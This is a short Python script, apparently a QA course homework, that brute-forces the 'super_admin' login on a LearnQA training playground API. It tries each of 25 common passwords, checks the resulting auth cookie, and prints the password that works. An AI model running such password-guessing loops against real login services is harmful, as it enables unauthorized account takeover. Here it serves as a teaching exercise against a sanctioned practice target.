import requests

url_get_secret_password_homework = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url_check_auth_cookie = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

pass_list = ["123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou", "111111",
             "123123", "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321", "555555", "lovely",
             "7777777", "welcome", "888888", "princess", "dragon", "password1", "123qwe"]

print('\n' + "Please, wait while I find the correct password..." + '\n')

for password in pass_list:
    data = {"login": "super_admin", "password": password}
    get_auth_cookie = requests.post(url_get_secret_password_homework, data=data).cookies
    check_auth_cookie = requests.get(url_check_auth_cookie, cookies=get_auth_cookie)

    if check_auth_cookie.text == "You are authorized":
        print(f'Valid password is: {password}' + '\n' + check_auth_cookie.text)
        break
    else:
        continue
